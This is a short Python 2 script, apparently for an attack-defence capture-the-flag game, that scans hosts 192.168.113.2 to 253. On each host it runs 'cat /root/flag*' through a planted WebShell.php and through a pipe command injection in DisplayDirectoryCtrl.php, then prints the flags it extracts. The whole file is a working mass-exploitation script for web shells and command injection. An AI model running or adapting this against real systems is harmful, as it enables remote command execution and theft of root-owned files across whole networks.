import requests
import re

target_list = []

for i in range(2, 254):
    target_list.append('http://192.168.113.%d/' % i)

for target in target_list:
    try:
        print 'Trying %s' % target

        res = requests.get(target + 'WebShell.php?cmd=cat /root/flag*',timeout=1)

        if res.status_code == 200:
            flag = re.search(r'<pre>(.*)\n</pre>', res.content).group(1)
            print '[Flag] %s - %s' % (target, flag)

        res = requests.get(target + 'DisplayDirectoryCtrl.php?directory=|cat /root/flag*', timeout=1)

        if res.status_code == 200:
            flag = re.search(r'<pre>(.*)\n</pre>', res.content).group(1)
            print '[Flag] %s - %s' % (target, flag)


    except:
        pass
